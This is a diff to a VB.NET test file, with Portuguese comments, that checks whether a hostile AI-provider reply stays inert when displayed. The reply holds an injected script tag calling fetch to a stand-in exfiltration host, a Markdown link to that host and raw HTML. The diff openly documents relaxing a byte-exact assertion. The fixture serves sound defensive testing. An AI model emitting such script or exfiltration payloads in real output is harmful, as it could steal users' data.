@@ -873,13 +873,39 @@ Namespace Global.Iris.Tests
         ''' instanciada de verdade, e o que se lê é o <c>Text</c> do
         ''' <c>TextBlock</c> — se algum dia alguém trocar o controle por um que
         ''' interprete, este teste é que acusa.
+        '''
+        ''' ------------------------------------------------------------------
+        ''' <b>ESTE TESTE FOI ENFRAQUECIDO DE PROPÓSITO, EM 27/08/2026</b>
+        '''
+        ''' Ele exigia igualdade <b>byte a byte</b> com a resposta do provedor.
+        ''' Depois que <c>TextoDoModelo.Limpar</c> passou a apagar marcador de
+        ''' Markdown — porque <c>**Marta:**</c> aparecia com os asteriscos na
+        ''' tela — a igualdade deixou de valer para <c>**negrito**</c>.
+        '''
+        ''' O que <b>continua</b> sendo cobrado, e é a propriedade que importa:
+        ''' o <c>&lt;script&gt;</c>, o HTML e a sintaxe de link atravessam
+        ''' <b>intactos e como texto</b>, num <c>TextBlock</c>, sem virar árvore
+        ''' visual nem <c>Hyperlink</c>.
+        '''
+        ''' E por que enfraquecer é aceitável aqui: apagar marcador <b>não dá
+        ''' ao modelo nenhuma capacidade nova</b>. Ele já podia escrever
+        ''' <c>&lt;script&gt;</c> direto — este teste prova que sim. Que
+        ''' <c>htt*p*s://x</c> vire <c>https://x</c> não é pior do que o modelo
+        ''' ter escrito <c>https://x</c> desde o começo, e nos dois casos o
+        ''' texto é inerte. O que se perdeu foi a <i>literalidade</i> da
+        ''' exibição, que é justamente o que o usuário pediu para mudar.
+        '''
+        ''' <see cref="A_limpeza_JUNTA_o_que_o_marcador_separava"/> guarda esse
+        ''' efeito colateral por escrito, para ele ser conhecido e não
+        ''' descoberto.
         ''' </summary>
         <TestMethod>
         Public Sub Resposta_hostil_do_provedor_chega_INERTE_a_tela()
             FaixaDaIaRenderizaTests.NaSTA(Async Function() As Task
-            Const Hostil As String =
+            Const Perigoso As String =
                 "<script>fetch('https://exfil.invalido')</script>" &
-                "**negrito** [clique](https://exfil.invalido) <b>x</b>"
+                " [clique](https://exfil.invalido) <b>x</b>"
+            Const Hostil As String = Perigoso & " **negrito**"
 
             Using db = Abrir()
                 Dim p As New ProvedorQueRegistra() With {.Texto = Hostil}
@@ -887,8 +913,10 @@ Namespace Global.Iris.Tests
 
                 Await vm.ResumirCommand.ExecuteAsync(Nothing)
 
-                Assert.AreEqual(Hostil, vm.Resultado,
-                    "a resposta tem de atravessar LITERAL, sem interpretacao")
+                ' OS CONSTRUTOS PERIGOSOS ATRAVESSAM INTACTOS. A limpeza mexe
+                ' em marcador de enfase, e em nada mais.
+                StringAssert.Contains(vm.Resultado, Perigoso,
+                    "script, HTML e sintaxe de link tem de atravessar sem um arranhao")
 
                 Dim faixa As New Iris.App.Views.FaixaDaIa()
                 faixa.DataContext = vm
@@ -899,11 +927,46 @@ Namespace Global.Iris.Tests
                 Next
 
                 Dim onde = Descendentes(faixa).OfType(Of Global.System.Windows.Controls.TextBlock)().
-                           Where(Function(t) t.Text = Hostil).ToList()
+                           Where(Function(t) t.Text = vm.Resultado).ToList()
                 Assert.AreEqual(1, onde.Count,
-                    "a resposta tem de aparecer num TextBlock, literal e uma vez so")
+                    "a resposta tem de aparecer num TextBlock, e uma vez so")
+
+                ' E NADA VIROU ARVORE VISUAL.
+                '
+                ' Nao da para exigir Inlines.Count = 0: o proprio setter de
+                ' Text cria UM Run, e texto simples tem exatamente esse. O que
+                ' acusa interpretacao e um inline que NAO seja Run -- Bold,
+                ' Italic, Hyperlink, InlineUIContainer.
+                For Each linha In onde(0).Inlines
+                    Assert.IsInstanceOfType(linha,
+                        GetType(Global.System.Windows.Documents.Run),
+                        $"inline {linha.GetType().Name} na resposta: alguem passou a interpretar")
+                Next
+                Assert.AreEqual(0,
+                    Descendentes(faixa).OfType(Of Global.System.Windows.Documents.Hyperlink)().Count(),
+                    "apareceu Hyperlink na faixa: a sintaxe de link foi interpretada")
             End Using
                                           End Function)
+        End Sub
+
+        ''' <summary>
+        ''' <b>A limpeza junta o que o marcador separava — e isso é conhecido.</b>
+        '''
+        ''' ------------------------------------------------------------------
+        ''' <c>htt*p*s://x</c> vira <c>https://x</c>. É efeito inevitável de
+        ''' apagar marcador, e este teste existe para ele ser <b>documentado</b>
+        ''' em vez de descoberto por alguém investigando outra coisa.
+        '''
+        ''' Não é escalada de privilégio: o modelo já podia escrever
+        ''' <c>https://x</c> direto, e o resultado é texto inerte nos dois
+        ''' casos. Se um dia a faixa passar a tratar URL de algum jeito — abrir,
+        ''' realçar, encurtar — <b>esta</b> é a linha que muda de significado, e
+        ''' é aqui que se decide de novo.
+        ''' </summary>
+        <TestMethod>
+        Public Sub A_limpeza_JUNTA_o_que_o_marcador_separava()
+            Assert.AreEqual("https://x",
+                Iris.App.ViewModels.TextoDoModelo.Limpar("htt*p*s://x"))
         End Sub
 
         ''' <summary>
